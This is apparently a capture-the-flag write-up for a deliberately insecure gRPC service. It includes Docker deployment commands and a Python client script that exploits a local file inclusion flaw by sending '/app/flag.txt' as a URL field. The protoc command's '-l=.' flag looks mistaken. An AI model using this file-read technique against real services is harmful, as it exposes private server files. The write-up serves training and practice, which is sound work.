------------------------------------------------------------------
# Deployment Notes
$ docker build -t Insecure_gRPC_service .
$ docker run -p 50051:50051 -p 80:80 Insecure_gRPC_service

------------------------------------------------------------------
# Write Up

# Step 0
Html comment says that the flag is located /app/flag.txt

# Step 1
Download the proto file:
http://<server_ip>/flag.proto
---> The flag.proto file has comment of the port of the gPRC service (Port:50051)

# Step 2
Generate libraries
python -m grpc_tools.protoc -l=. --python_out=. --grpc_python_out=. flag.proto

# Write a client python script to exploit the LFI and read the flag
Example script:

import grpc
import flag_pb2
import flag_pb2_grpc

# Set up the gRPC channel
channel = grpc.insecure_channel('localhost:50051')

# Create a stub for the service
stub = flag_pb2_grpc.ExternalDataServiceStub(channel)

# Create a request message
request = flag_pb2.ExternalDataRequest(url='/app/flag.txt')

# Send the request and get the response
response = stub.GetData(request)

# Process the response
print(response.data)
